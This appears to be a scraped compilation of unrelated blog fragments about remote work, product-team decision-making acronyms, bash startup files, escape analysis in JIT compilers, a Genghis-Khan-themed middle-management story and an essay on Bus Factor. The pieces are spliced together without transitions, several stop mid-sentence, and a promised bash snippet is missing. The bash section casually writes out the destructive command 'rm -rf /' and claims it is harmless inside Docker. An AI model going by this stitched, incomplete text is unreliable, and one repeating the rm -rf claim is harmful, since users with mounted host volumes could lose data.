<p>There are so many tools to make communication while working remotely easy. We utilize Slack, have regular calls on Zoom, write our monthly feedback on 15five, and much more. If we need to brainstorm, we get on a video call or write in Slack.</p>
<p>There is one potential downside of working remotely for one target group - junior engineers. I will explain why I don’t think it is a rule but purely depends on the person. While junior engineers can always sit next to their mentors in a regular office job, here it is a bit different. Your company has to have really good documentation and processes so they don’t get lost. But, on the other hand, at MailerLite we are always looking for persons that are “self-starters” and can pick-up things themselves without or with minimal interference from other colleagues. In my experience, juniors can struggle at the beginning for the first (half of) year, but after that, they are usually stronger with knowledge and work ethics than juniors in regular offices. They are more independent in work and can easily learn new things and implement them.</p>
<p>The key thing in remote work is overcommunication. I can’t stress enough how much it is important. As a pitfall of remote work, you must write and overshare because there is no such thing as over-communication. Why do we do that? We are a remote-first company, but we have an office in Vilnius if someone wants to work from it. A couple of people are working from the office, but as I have been there a couple of times it is the most silent office I have ever been in. The communication is done via Slack or conference calls with everyone, so no one is left out, as this can be a problem when you have a combination of office and remote work in your company.</p>
<p>Productivity, personally, is sky-rocketing once I switched to the remote. I get at least 50% more stuff done as there are no distractions, unnecessary small-talks, listening to office gossips, braggings, and other things that can happen in the office.</p>
<p>Freedom is also an important thing. Sometimes I have to do something personal in the morning, or the middle of the day. Sometimes, I can go to the gym during the day and go back refreshed and start working. I can go to my hometown when I want to and work from there. I can travel wherever I want and work from there. I have become more social as I have more time for my friends and family and am less stressed. No one is looking at how much time you are spending working - but if you did the task or not which is the only important thing.</p>
<p>The biggest indicator that remote work is a benefit for both an employee and the company is that Microsoft and Google are now permanently remote if you want to. Pandemic nudged them in that direction, but they have seen the benefits and adapted.</p>
<p>Times are changing. Gosh, what a cliche sentence. <strong>Times are always changing, it is up to us if we want to adapt</strong>. Remote work has been around for a long time, but most of the companies resisted the change. I’m happy that companies are now forced to change because it requires a change of mindset, but there is a quote from my favourite TV series of all time, Twin Peaks, <em>“There’s some fear in letting go”</em>.</p>

<p><em>Caveat</em>: what you’ll read about are (usually) not personality types but behaviors in a specific (type of) situation. Acting like a HIPPO, a WOLF, a RHINO or a ZEBRA doesn’t make anyone a bad person. You’re still a team, aim to understand where they are coming from, and, well, they might even be right, with the wrong communication style. </p>

<p>It can be tempting to give in to the HIPPOs – founders or CEO or VPS who want to make all the decisions – but don’t let them steer you off course.</p>
<p>Bring everything back to your vision and objectives. If the HIPPOs aren’t aligned with those, you could be headed for dangerous waters.</p>
<p>Don’t let your HiPPO kill your ideas – inform them with data and make them a <a href="https://www.forbes.com/sites/bernardmarr/2017/10/26/data-driven-decision-making-beware-of-the-hippo-effect/" target="_blank" rel="noopener">Data-driven HiPPO</a>! </p>

<h2>The WOLF – Working On the Latest Fire</h2>
<div>
<div>
<p>The WOLF has a short attention span and a temptation to jump from one problem to the next. They tend to only enjoy fighting fires, This will disrupt your team’s focus and effectiveness, making you easy prey for your competitors.</p>
<p>Create a process for collecting feedback about problems, bugs and only consider these along with all other requests. Set up triaging and set clear priorities and a method for prioritization.</p>

<p>The RHINO is just there to collect a paycheck without contributing much to the team. They might not be actively impeding your decision-making, but they are not helping much either. </p>
<p>Having a clearly defined prioritization process can help ensure all your team members understand how decisions are made and give them the confidence to actively participate. Hopefully, in this process, everyone is empowered to have a say and it doesn’t turn into “Well our process is that the boss tells you what’s important” – which is exactly how you end up with a team of disillusioned RHINOs.</p>

<h2>The ZEBRA – Zero Evidence But Really Arrogant</h2>
<div>
<div>
<p>ZEBRAs think they know it all but rely on their instinct rather than any actual evidence. To stave off the ZEBRAs in your midst, make sure that you’ve got data to back up your decisions.</p>
<p>Come up with quick experiments you can run to test ideas and gather evidence. Push for a data-driven culture.</p>

<h2>And one extra…. the RHINO again! This time, Really High value New Opportunity</h2>
<p>Usually, it’s a salesperson with an amazing value customer deal for an unplanned feature insisting re-allocating resources to build what’s required to win the deal. The results, sadly, are an ignored strategy and roadmap and resources allocated to serve a single customer.</p>
<p>There are two ways here:</p>
<p>1, Chase the RHINO away: Compare the opportunity cost and value and argue against signing the deal if you have customer insight supporting the roadmap.<br>2, Tame the RHINO: Adjust the roadmap if the opportunity includes features you already had planned for later in the year.</p>

      <h3 id="introduction">Introduction</h3>

<p>Sometimes, when I remotely login to some Linux computers or use Docker containers, I would find the shell is plain black and white, different from the colorful shell I am used to dealing with on my local machine. This sometimes makes it difficult to look for libraries, executables, and folders. Sometimes, some executables could be called directly from a local shell but from a remote login shell they are not directly callable.</p>



<p>It turns out that the shell is an executable and it is “configured” by special shell scripts such as <code>~/.bashrc</code>, <code>~/.profile</code>, <code>~/.bash_profile</code>. In this blog post, I would like to briefly discuss the differences between these scripts.</p>

<h3 id="bashrc">~/.bashrc</h3>

<p>I modify the <code>~/.bashrc</code> file from time to time, because sometimes I would like to set some environment variables, including <code>PATH</code> which is an environmental variable in Linux and other Unix-like operating systems that tells the shell which directories to search when looking for executable files. But I have been ignoring the commented block at its beginning for decades.</p>

<div><div><pre><code>$ cat ~/.bashrc 
# ~/.bashrc: executed by bash(1) for non-login shells.
# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
# for examples
...
</code></pre></div></div>

<p>This means that in a local shell where <code>bash</code> is being used, this shell script will be executed immediately after <code>bash</code> is executed. There are many other shell executable variants, such as <code>zsh</code>. <code>~/.bashrc</code> is only specific to <code>bash</code>.</p>



<p>There are many settings in the <code>~/.bashrc</code> that makes the shell look colorful. For example,</p>

<div><div><pre><code># enable color support of ls and also add handy aliases
if [ -x /usr/bin/dircolors ]; then
    test -r ~/.dircolors &amp;&amp; eval "$(dircolors -b ~/.dircolors)" || eval "$(dircolors -b)"
    alias ls='ls --color=auto'
    #alias dir='dir --color=auto'
    #alias vdir='vdir --color=auto'

    alias grep='grep --color=auto'
    alias fgrep='fgrep --color=auto'
    alias egrep='egrep --color=auto'
fi
</code></pre></div></div>

<h3 id="profile">~/.profile</h3>

<p>The comment block found in the <code>~/.profile</code> explicitly tells us that it will be executed for the login shells. However, if <code>~/.bash_profile</code> or <code>~/.bash_login</code> exists, <code>~/.profile</code> will not be executed.</p>

<div><div><pre><code>$ cat ~/.profile 
# ~/.profile: executed by the command interpreter for login shells.
# This file is not read by bash(1), if ~/.bash_profile or ~/.bash_login
# exists.
# see /usr/share/doc/bash/examples/startup-files for examples.
# the files are located in the bash-doc package.

# the default umask is set in /etc/profile; for setting the umask
# for ssh logins, install and configure the libpam-umask package.
#umask 022

# if running bash
if [ -n "$BASH_VERSION" ]; then
    # include .bashrc if it exists
    if [ -f "$HOME/.bashrc" ]; then
	. "$HOME/.bashrc"
    fi
fi

# set PATH so it includes user's private bin if it exists
if [ -d "$HOME/bin" ] ; then
    PATH="$HOME/bin:$PATH"
fi

# set PATH so it includes user's private bin if it exists
if [ -d "$HOME/.local/bin" ] ; then
    PATH="$HOME/.local/bin:$PATH"
fi
</code></pre></div></div>

<p>The default content of the <code>~/.profile</code> is simple. In most cases, it inherits whatever is in the <code>~/.bashrc</code>, and adds some user specific executable filepath to the environment variable <code>PATH</code>. So if there are commands that make the shell look colorful in the <code>~/.bashrc</code>, the login shell should also look colorful.</p>

<h3 id="bash_profile">~/.bash_profile</h3>

<p>Unfortunately, in most of my login trials, the shells were never colorful, and sometimes the environment variables did not match my expectation. In those cases, this is because there exists a <code>~/.bash_profile</code> and therefore <code>~/.profile</code> or <code>~/.bashrc</code> is never executed. Usually the <code>~/.bash_profile</code> will be empty, which means that we would not have the environment and appearance that we have in our local shell.</p>



<p>To make the login shell “back to normal”, we could either delete the <code>~/.bash_profile</code> or modify the <code>~/.bash_profile</code> by adding some commands like</p>



<h3 id="caveats">Caveats</h3>

<p>Sometimes, a non-color shell could be helpful. It can be used to indicate that you are not working in local shell, and that what you are seeing could either be a Docker shell or a remote login shell. When we know what shell we are dealing with, we will be more likely to avoid dangerous operations. For example, in a Docker shell, we could do almost anything, such as <code>rm -rf /</code> without sudo, without harming the local system.</p>

<h3 id="acknowledgement">Acknowledgement</h3>

<p>I would like to thank Liam Keane from Hacker News for correcting the grammars and polishing the words in the blog post.</p>

<p>With software engineering, speed and memory are the basic measurement-benchmarks. For programming language implementations, the two affect each other heavily. In JIT compilers, that means storing more things in memory to speed up the program drastically. It also means putting time into garbage collection to keep memory down, spending time to try to eliminate allocations and deciding where to put some piece of data. </p>
<p>Escape Analysis is a technique that determines the behaviour of how a variable (more specifically, a pointer) is used in a certain scope, and whether it not it escapes that scope (the scope is usually a function). Escape analysis allows the program to stack allocate (here is an article on <a href="https://stackoverflow.com/questions/79923/what-and-where-are-the-stack-and-heap/80113#80113">Stack vs Heap </a>allocations) when it's determined the variable will not be used outside of the scope or in other cases, try to eliminate the allocation completely. </p>

</h3>
<p>Pypy puts a lot of work into minimizing <em>boxing</em>, which is done through escape analysis. Boxing is when a primitive is boxed into an object wrapper type, such as an <code>int</code> to <code>Integer</code> in Java. Object oriented language implementations often utilize boxing (sometimes called auto-boxing), including JavaScript, C#, Haskell and others! Computers natively understands types like booleans and integers, but not objects, and unfortunately many languages need to store most of their data as an object and not the primitive. For example, <code>314</code> as a constant can be stored as a primitive on the stack, but when <code>314.toString()</code> is executed, <code>314</code> has to be boxed so that the method can be run on the object. Unboxing is performed to extract the value. </p>
<p>Boxing and unboxing is an expensive operation, with .NET citing 20x the time for boxed assignment and 4x the time for unboxing assignment (when you explicitly cast back). Pypy also has expensive boxing operations, as it's not just assigning/computing more values but organizing them into a heap structure. </p>
<p>Pypy considers this to be its second most important problem, and uses "virtual objects", also called virtualisation. It's a fancy term that means they avoid creating the entire heap structure, store the primitive value (not on the heap) and mock any object-operations that need to happen. While the virtual object is used in some applicable scope, read and writes are done to the virtual object without the expense of boxing/unboxing. Even more computation is saved as since the virtual object exists and no guards need to exist to verify information about the value in the object, whereas guards are usually in place to check the class after loading a value. </p>
<p>Pypy will virtualise onto the stack optimistically and then allocate later should it become necssary. Escape analysis is really powerful in JITs mostly because jitted langauges tend to be more dynamic, but also because they can very aggressively stack allocate.  Languages that compile once have to be completely confident that the escape analysis is valid (or also compile code in case of failure) <em>and</em> make decisions about how far it should look to determine a scope. JITs can kind of just hope it'll work and then actually do the allocation if it doesn't -- and remember what happened for next time (though that makes it sound a lot easier than it actually is). </p>
<p>For example;</p>
<pre><code><span>x </span><span>= </span><span>0
</span><span>for </span><span>i </span><span>in </span><span>range</span><span>(</span><span>10000</span><span>):
  </span><span># Integer.random() is not an actual stdlib operation in Python, I used it to indicate a non-primitive object is created
  </span><span>y </span><span>= </span><span>Integer</span><span>.</span><span>random</span><span>() </span><span>+ </span><span>x
  x </span><span>+= </span><span>y </span><span>* </span><span>4 </span><span># this would also involves boxing without escape analysis, since operators are implemented as methods
</span><span>print</span><span>(x)
</span></code></pre>
<p>There are two cases of virtualisation here. The first is <code>y</code>, which will be virtualised as it does not escape. Thus in the second line of the loop, Pypy would no longer need a guard for the value of <code>y</code>. This saves us a lot more than just constructing and traversing the heap structure. When boxed, Pypy has to check the class types of <code>y</code> and <code>x</code> due to the dynamic-ness of Python -- can these values be added? If they can, where is the method to describe how they are added (Python allows operator overloading). It also has to recreate a boxed object to reassign to <code>y</code> and in more complex cases could leave behind additional garbage for the GC. </p>
<p><code>x</code> on the other hand, does escape, but it's still valuable to virtualise it, for that allocation is in a loop and the escape is outside the loop. When a jump instruction comes in (loop ends), it’ll come with code that actually allocates <code>x</code> for the garbage collector and future use. Another case of escape analysis can be found in methods;</p>
<pre><code><span>def </span><span>foo</span><span>():
  x </span><span>= </span><span>{</span><span>"A"</span><span>: </span><span>1</span><span>, </span><span>"B"</span><span>: </span><span>2</span><span>}
  </span><span>return </span><span>x[</span><span>"A"</span><span>]
</span></code></pre>
<p>In this case, <code>x</code> will likely never escape and the allocation isn't even needed to execute the rest of the function. This particular case may actually be constant-folded away (the constant is replicated at usage sites), but abstractions of this pattern will use escape analysis. Escape analysis also often takes place for language-internal operations, and I'll describe how Javascript features and internals makes escape analysis very important. </p>
<h3 id="how-javascript-uses-escape-analysis-in-language-internals">How Javascript Uses Escape Analysis in Language Internals<a href="#how-javascript-uses-escape-analysis-in-language-internals" aria-label="Anchor link for: how-javascript-uses-escape-analysis-in-language-internals"> <i></i></a>
</h3>
<p>The most complex question about escape analysis (other than maybe "how do I implement it") is probably "is this only beneficial to very shortlived variables, and if so how does it help much?". As mentioned in the Pypy example, it is sometimes to protect allocations that are made by the language implementation rather than the programmer. Here's a quick example in Javascript (example token from <a href="https://www.jfokus.se/jfokus18/preso/Escape-Analysis-in-V8.pdf">this PDF</a>, which has a <a href="https://www.youtube.com/watch?v=KiWEWLwQ3oI">corresponding talk</a> that might be elementary at this point in the blog post). </p>
<pre><code><span>function </span><span>bar</span><span>(</span><span>o</span><span>) </span><span>{
  </span><span>return </span><span>Math</span><span>.</span><span>sqrt</span><span>(</span><span>o</span><span>.</span><span>x</span><span>*</span><span>o</span><span>.</span><span>x </span><span>+ </span><span>o</span><span>.</span><span>y</span><span>*</span><span>o</span><span>.</span><span>y)
</span><span>}

</span><span>function </span><span>foo</span><span>(</span><span>i</span><span>) </span><span>{
  </span><span>return </span><span>bar</span><span>(</span><span>{</span><span>x: </span><span>i</span><span>, y: </span><span>i}</span><span>)
</span><span>}
</span></code></pre>
<p>One might not expect anything to allocate even without escape analysis, but when you create the object to pass into <code>bar</code> it is created and allocated by default since it now exists for <code>bar</code> and can escape <code>bar</code>. This is a good example of a full allocation elimination, the allocation isn't just moved into the stack, rarther <code>bar</code> is inlined and then the usage of any object at all can be optimized away. </p>
<h3 id="luajit-allocation-sinking">LuaJIT Allocation Sinking<a href="#luajit-allocation-sinking" aria-label="Anchor link for: luajit-allocation-sinking"> <i></i></a>
</h3>
<p>In most languages that box, essentially everything gets a box (except <code>null</code> and <code>undefined</code> types, though <code>NaN</code> in Javascript is boxed into a <code>Number</code> so terms and conditions may apply). LuaJIT is smarter off the bat and manages to not box floats and is good at not allocating (when I say "allocate", I mean to the heap) constants. </p>
<p>LuaJIT's does something called <a href="http://wiki.luajit.org/Allocation-Sinking-Optimization"><em>Allocation Sinking</em></a>, which is based on escape analysis and the result is very powerful allocation removals, doing things that even the age-old Hotspot can't do. Pypy implemented a vast majority of the things that LuaJIT did (see this <a href="http://www1.maths.lth.se/matematiklth/vision/publdb/reports/pdf/ardo-bolz-etal-dls-12.pdf">2012 paper</a>) though I'd want to describe some of these optimizations in the context of LuaJIT rather than Pypy because LuaJIT gave me free examples. </p>
<p>When data is allocated, there's typically a "store" and then a "load" later on. Store-to-load forwarding is essentially what it sounds like, getting the subsequent "load" function to receive data directly from the location of storing. This is used to have powerful allocation sinking, more commonly called "code motion" (or specifically, loop-invariant code motion as JITs tend to be concerned with loop optimizations). This examples do not use executable Lua code</p>
<pre><code><span>local </span><span>x </span><span>= </span><span>0
</span><span>for </span><span>i</span><span>=</span><span>1</span><span>,</span><span>1000 </span><span>do
  </span><span>x </span><span>= </span><span>y </span><span>+ </span><span>z </span><span>-- i don't think this actually allocates in lua, but let’s pretend it does
  </span><span>local </span><span>a </span><span>= </span><span>i </span><span>+ </span><span>x
</span><span>end
</span></code></pre>
<p>What we want is for <code>x</code> to be declared outside of the loop, as it saves us that allocation every time we iterate. This could be done through code motion. </p>
<pre><code><span>local </span><span>x </span><span>= </span><span>y </span><span>+ </span><span>z 
</span><span>for </span><span>i</span><span>=</span><span>1</span><span>,</span><span>1000 </span><span>do
  </span><span>a </span><span>= </span><span>i </span><span>+ </span><span>x
</span><span>end
</span></code></pre>
<p>In the example below, the allocation of <code>i</code> to <code>y</code> should be moved to be inside the conditional. Note that this optimization is not quite covered by the base strategy described for Pypy.</p>
<pre><code><span>for </span><span>i</span><span>=</span><span>1</span><span>,</span><span>1000 </span><span>do  
  local </span><span>y </span><span>= </span><span>i
  </span><span>if </span><span>random</span><span>() </span><span>&gt; </span><span>0.5</span><span>:  </span><span>-- but does not escape this if statement
    </span><span>x </span><span>= </span><span>y </span><span>+ </span><span>z
  </span><span>local </span><span>a </span><span>= </span><span>i </span><span>+ </span><span>x
</span><span>end
</span><span>-- should become
</span><span>for </span><span>i</span><span>=</span><span>1</span><span>,</span><span>1000 </span><span>do  
  if </span><span>random</span><span>() </span><span>&gt; </span><span>0.5</span><span>: 
    </span><span>local</span><span> </span><span>y </span><span>= </span><span>i
    x </span><span>= </span><span>y </span><span>+ </span><span>z
  </span><span>local </span><span>a </span><span>= </span><span>i </span><span>+ </span><span>x
</span><span>end
</span></code></pre>
<p>Here, LuaJIT defers the write and <em>forwards</em> the data to the read. As a result, the allocation and read is very much removed. The forwarding destination is the point of escape, which is where the escape analysis comes in. </p>
<p>LuaJIT has an explicit mark-and-sweep pass to do sinks. For an example that highlights the allocation sinking, LuaJIT performed on par with C++ and 700x faster than Lua. Specifically (taken from the <a href="http://wiki.luajit.org/Allocation-Sinking-Optimization#implementation%5B">LuaJIT Blog</a>): </p>
<pre><code><span>local </span><span>ffi </span><span>= </span><span>require</span><span>(</span><span>"ffi"</span><span>)
</span><span>local </span><span>point
point </span><span>= </span><span>ffi</span><span>.</span><span>metatype</span><span>(</span><span>"struct { double x, y; }"</span><span>, </span><span>{
  </span><span>__add </span><span>= </span><span>function</span><span>(</span><span>a</span><span>, </span><span>b</span><span>)
   </span><span>return </span><span>point</span><span>(</span><span>a</span><span>.</span><span>x </span><span>+ </span><span>b</span><span>.</span><span>x, </span><span>a</span><span>.</span><span>y </span><span>+ </span><span>b</span><span>.</span><span>y)
  </span><span>end
</span><span>}</span><span>)
</span><span>local </span><span>a</span><span>, </span><span>b </span><span>= </span><span>point</span><span>(</span><span>1.5</span><span>, </span><span>2.5</span><span>), </span><span>point</span><span>(</span><span>3.25</span><span>, </span><span>4.75</span><span>)
</span><span>for </span><span>i</span><span>=</span><span>1</span><span>,</span><span>100000000 </span><span>do </span><span>a </span><span>= </span><span>(</span><span>a </span><span>+ </span><span>b</span><span>) </span><span>+ </span><span>b </span><span>end
</span><span>print</span><span>(</span><span>a</span><span>.</span><span>x, </span><span>a</span><span>.</span><span>y)
</span></code></pre>
<p>This example does some things that are familiar from the Pypy example -- it creates temporary objects while performing the arithmetic (<code>point(a.x + b.x, a.y + b.y)</code>). These two under-the-hood allocations are expensive, but LuaJIT optimizes …</p></section></div>

Genghis mentions his excitement at Thursday’s executive council meeting, with the company’s top layer of middle management listening in.</p><p>Mandukhai, the middle manager two layers above you, was present. She conveys the takeaways in her regular Friday morning coffee catchup with the managers that report to her, including the Foobar team lead, your boss, Subotai.</p><p>Fighting for relevance after a bumpy year, Subotai grows convinced that working on this Beezlyboo thing might be his ticket back into Mandukhai's good graces.</p><p>You enter the office on Monday morning, unsheathe your sword, and balance it carefully on top of your monitor before sitting down and getting to work. <i>Little do you know that two weeks from now, half your time will be spent on this new thing called Beezlyboo.</i></p><div><h3>How Middle Management Emerges</h3><p>This is an unfortunately common description of how decisions are made in many of today’s <del>Khanates</del> companies. Why is that? Let’s take a look at how communication and decision making evolve as companies grow larger.</p><p>Here’s how many companies begin: <br><img src="https://middle-out.io/images/genghis/2company.png" alt="2 people companies"></p><p>Two founders, working closely to get their new startup off the ground.</p><p>A more mature company might look more like this:<br><img src="https://middle-out.io/images/genghis/k3company.png" alt="Small company"></p><p>That’s Google circa 1999. Individuals hold increasingly defined roles. Management and process are beginning to creep in, but all anyone really wants to do is get on with things, management be damned. Grabbing a colleague to discuss something is as easy as shouting across the office.</p><p>But as companies grow larger, the majority end up looking more like this:<img src="https://middle-out.io/images/genghis/3comp.png" alt="Large company"></p><p>This is of course an over-simplification as every organization maintains informal networks, cross-functional teams, and parallel networks. But it is a useful representation to understand how hierarchies simplify the sharing of information by creating highways for it. Additionally, we will assume that every team operates in a mesh (even if we were not skilled enough to draw those relations).</p><p>See those ‘o’ nodes? That’s middle management. Layers and layers of it. Its main purpose is to simplify decision making and communication by concentrating ownership of different parts of the business in the hands of a select few.</p><figure><d-figure id="boldify"><div svelte-1667065745=""><p>For the more mathematically inclined, middle management splits the previously shown complete graphs with <span><span><span><math><semantics><mrow><msub><mi>K</mi><mi>n</mi></msub><mo>=</mo><mfrac><mrow><mi>n</mi><mo>(</mo><mi>n</mi><mo>−</mo><mn>1</mn><mo>)</mo></mrow><mrow><mn>2</mn></mrow></mfrac></mrow><annotation encoding="application/x-tex">K_n = \frac{n(n-1)}{2}</annotation></semantics></math></span></span></span> edges into multiple complete subgraphs with <span><span><span><math><semantics><mrow><msub><mi>M</mi><mi>n</mi></msub><mo>=</mo><msubsup><mo>∑</mo><mi>i</mi><mi>n</mi></msubsup><msub><mi>K</mi><mrow><mi>m</mi><mo>(</mo><mi>i</mi><mo>)</mo><mo>+</mo><mn>1</mn></mrow></msub></mrow><annotation encoding="application/x-tex">M_n = \sum_i^nK_{m(i)+1}</annotation></semantics></math></span></span></span> edges, where <span><span><span><math><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span></span></span> runs over managers and <span><span><span><math><semantics><mrow><mi>m</mi><mo>(</mo><mi>i</mi><mo>)</mo></mrow><annotation encoding="application/x-tex">m(i)</annotation></semantics></math></span></span></span> is the number of people they manage.

When CEO Genghis or Kublai, another middle manager, want to figure out what’s going on with the Foobar team (highlighted above in Millenial pink), all they need do is call Subotai.

While the ‘x’ nodes focus on the work at hand, the ‘o’ nodes are busy talking and aligning amongst themselves. This creates two problems: the ‘o’s lose touch with the actual work being done, while the ‘x’s cannot easily see, communicate, or influence beyond team boundaries. Which, remember, is why you’ll be surprised when Beezlyboo lands on your desk in two weeks' time.</p><h3>What Companies Are Doing About This Today</h3><p>So far we've been talking about idealized companies. In reality, there are informal networks that permeate company hierarchies. There are also good and bad ‘x’s and ‘o’s. We know a lot about what a good ‘o’ is (or should be). There’s an <a href="https://www.forbes.com/sites/vickyvalet/2019/03/19/americas-best-management-consulting-firms-2019/#656906003d00">entire industry out there dedicated to this</a>, complete with degrees (MBAs) and reading material (those management books you tend to find in airport bookshops).</p><p>One thing ‘o’s obsess over is how best to organize things, which is great. That's their job, after all. The problem is that their solutions are often clunky.

Ironically, it’s the ‘o’s that instigate these —  often to the complete bewilderment of the ‘x’s.</li><li><b>Surveys:</b> because making the ‘x’s click through an annoying ten-page annual survey is a great way of discovering how they really feel. Right? Right. </li></ul><p>If these solutions sound drab and disengaging, it's because they are. <a href="https://en.wikipedia.org/wiki/Ronald_Coase">Ronald Coase</a>, the 1991 Nobel laureate in economics, published an <a href="https://onlinelibrary.wiley.com/doi/full/10.1111/j.1468-0335.1937.tb00002.x">influential essay in 1937</a> on why firms even appear, and mentions that the benefits of larger firms are quickly outweighed by the overheads of maintaining their complex hierarchies and the misallocations of resources which stem from this. In a more modern work, Gary Hammel and Michele Zanini demonstrate in <a href="https://www.humanocracy.com/">Humanocracy</a> -- another one of those airport books -- that:                </p><p>A <a href="https://www.gallup.com/workplace/236552/managers-engaged-jobs.aspx">2018 Gallup study</a> found two-thirds of US employees and 51 percent of US managers to be disengaged at work.</p><p>In 2018, there were 146 million employees in the US workforce. [...] Of these, 20.5 million were managers and supervisors. In addition, there were 6.4 million employed in administrative support functions. In total, then, the bureaucratic class comprises 26.9 million individuals or 18.4 percent of the US workforce.

You know, just throw some tech and AI at it.</p><p><b>Genghis:</b> Oh god, here we go again with your AI thing.<br></p><p>He's right: here we go.<sup>2</sup> One of the most significant transformations due to play out over the next decade is the <a href="https://www.cnbc.com/2019/06/20/slack-ceo-predicts-end-of-company-email-as-we-know-it-in-7-years.html">death of email</a> in within-company communications and its replacement by tools like Slack and Teams. Not only do Slack and Teams introduce a new medium for companies to communicate in, they also allow for modern third-party integrations via their APIs. That’s something email tools like Gmail or Outlook never quite got right.</p><p>On top of this, there's an unfolding generational shift. Millennials will continue to graduate to positions of power as the 2020s progress — and they’ve grown up using online chat protocols and social networks.</p><p><b>Ogedei:</b> So here’s the thing, Dad. The way we organize ourselves in companies will change because young people like me communicate in new and different ways.</p><p>The first wave of startups attempting to tackle this — like <a href="https://knowyourteam.com/">Know Your Team (KYT)</a>, <a href="https://www.ally.io/">Ally</a>, <a href="https://lattice.com/">Lattice</a>, <a href="https://www.donut.com/">Donut</a>, <a href="https://withcadence.io/">Cadence</a>, and a handful of others — are already well on their way.</p><p>Let's take KYT as an example.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
       <p>A friend at a prominent tech company took last month off using their new covid policy. When he got back to work last week, he was horrified. Not to see that things had fallen apart in his absence, but to realize that they hadn’t. Overwhelmingly, life without him had continued as normal.</p>
<p>This is not a coincidence. A company dependent on a single person’s work has a single point of failure. In tech jargon, they have low Bus Factor, the number of people who would have to get hit by a bus for the project to fail. The higher your Bus Factor, the greater your institutional resilience.</p>
<p>But it’s hard to reconcile this experience with faith in an impactful career. If a firing squad executes a prisoner, we can say that each shooter is sufficient but not necessary. The success of the project depends on the shooters in aggregate, but not on any person in particular.</p>
<p>It’s easy to understand why an organization might want this kind of redundancy. Sure, it’s wasteful and inefficient, but it prevents the greatest threat to any company: giving employees leverage.</p>
<h3 id="The-Misery-of-Redundancy"><a href="#The-Misery-of-Redundancy" title="The Misery of Redundancy"></a>The Misery of Redundancy</h3><p>If you’re reading this, you’re probably well versed on sublinear returns to headcount. You know about the Mythical Man-Month, and understand that communication scales quadratically. You shudder at the thought of growing complexity.</p>
<p>But the untold story isn’t about efficiency, it’s about negative returns to engagement. One person on a project is personally responsible. Two people might manage to coordinate. Beyond that, you’re in the endless hellscape of team projects.</p>
<p>Remember the last time you were assigned partners in school? A team project is a game of chicken. Each participant signals their willingness to fail through procrastination, until finally at the last minute someone defects and does all the work. The more you care, the more you lose.</p>
<p>(At least those projects ended. As a friend once put it, the weirdest thing about working at large companies is that you’ll wake up one morning, have a new teammate randomly assigned to you, and proceed to see them 8 hours a day every day until one of you quits or dies.)</p>
<p>This is the world of high Bus Factor. The greater a project’s supposed “resilience”, the more each person becomes dispensable. Sufficient, but not necessary.</p>
<p>(Even if you’re working in a mission-driven company, your job is meaningless unless you’re personally responsible for the success of that mission. The US Government might be the single more important organization in the world. How do you think it feels to work as an entry level bureaucrat?)</p>
<p>Have you ever wondered why you spend so much time writing design docs and detailed PRs? Or why you’re constantly stuck in meetings explaining what you do to various groups of people? Or why your project has a separate engineer, EM, PM, Designer and Tech Lead? Maybe these are best practices, maybe we’ve all settled on the right way of doing things.</p>
<p>But they’re also ways of making sure that if you get hit by a bus, no one has to care.</p>
<h3 id="Self-Reinforcing-Churn"><a href="#Self-Reinforcing-Churn" title="Self-Reinforcing Churn"></a>Self-Reinforcing Churn</h3><p>Every large tech company runs performance reviews twice a year. Don’t ask me why, it’s the way things have always been done.</p>
<p>Simultaneously, the average tenure at these companies hovers at around 2 years.</p>
<p>That means that at any given point, fully one quarter of your teammates are totally checked out.</p>
<p>On the high end, there are people who know they’re leaving in the next year, and just have absolutely no reason to care. If you’re at the beginning of a new review cycle, you’re 6 months away from getting PIP’d, which means you’re 12 months away from getting fired.</p>
<p>Odds are, you’re going to lose the game of chicken. You might not have the most to lose, but unless you’re also quitting next cycle, you certainly don’t have the least.</p>
<p>For the employer, the upshot is that anyone can quit at any time. If you’re on a 12 person team, you might lose 3 people each half. The only viable response is to up the Bus Factor, layer on more redundancy, and limit the importance of each individual.</p>
<p>Of course, the irony is that it’s precisely this sense of replaceability that drives churn in the first place! The more employees are alienated, the more willing they are to leave as soon as their equity vests.</p>
<p>So this ends up being a vicious cycle where higher churn forces a higher Bus Factor, which causes alienation, which increases churn, and so on until you either die or become Oracle.</p>
<h3 id="Escaping-the-Labyrinth"><a href="#Escaping-the-Labyrinth" title="Escaping the Labyrinth"></a>Escaping the Labyrinth</h3><p>The flip side is that there’s still hope.</p>
<p>Since the cycle is self-reinforcing, we can break it in the middle and slay the ouroboros. There’s historical path dependence, but no fundamental reason we have to live this way.</p>
<p>The alternative to redundancy isn’t fragility, it’s personal responsibility. It’s keeping your Bus Factor low.</p>
<p>In this world, you can develop specific mastery instead of a broad assortment of skills. You can be a craftsman instead of a code monkey, understand systems deeply instead of cargo culting best practices.</p>
<p>Imagine working at a company where every single one of your coworkers gives a shit. Imagine knowing that your contributions are important, that the world is different because of your existence.</p>
<p>That’s Bus Factor 1.</p>
<p>As far as I can tell, this is basically how SpaceX works. It’s not a coincidence that they’re <a target="_blank" rel="noopener" href="https://www.payscale.com/data-packages/top-tech-companies-compared">ranked #1 for both stress and sense of meaning</a>. If you hear that employees are overworked and underpaid, don’t cry abuse, ask how they’re getting compensated instead.</p>
<h3 id="FAQ"><a href="#FAQ" title="FAQ"></a>FAQ</h3><p><strong>Why exactly does leverage even matter?</strong><br><em>A priori</em>, it shouldn’t. If all employees have leverage, there’s nothing to negotiate for. You could ask for more money, but everyone else could too, eventually the company falls apart and you all lose.</p>
<p>But <em>a posteriori</em>, we can work backwards from behavior. If companies are willing to sacrifice efficiency, that is itself evidence of exploitation.</p>
<p><strong>That sounds crazy. If engineers are actually underpaid, why don’t they just go somewhere else? Why doesn’t the market raise salaries?</strong><br>I’ve screened resumes from entry level engineers who claim to have saved their companies millions of dollars. The crazy part is that I believe it! If you can make even the smallest change to a ranking algorithm, or improve the performance of a costly computation, or run an experiment that marginally increases click-through rate, the effects multiply out across a huge user base.</p>
<p>And yet, I don’t know a single entry level engineer getting paid commensurately.</p>
<p>First, there’s a lack of counterfactual impact. Sure, you saved the company a million dollars, but if you didn’t take the job someone else would, and they would have done the same work.</p>
<p>Your impact looks huge, but in a high Bus Factor world, your actual impact is just the delta between your ability and the next best engineer. You might be able to negotiate another $10k, but not two orders of magnitude more.</p>
<p>Second, you don’t own the means of production. Your skills are only worth millions of dollars in the particular context of this company. You can’t walk away and produce that value on your own. You depend on the company much more than it depends on you.</p>
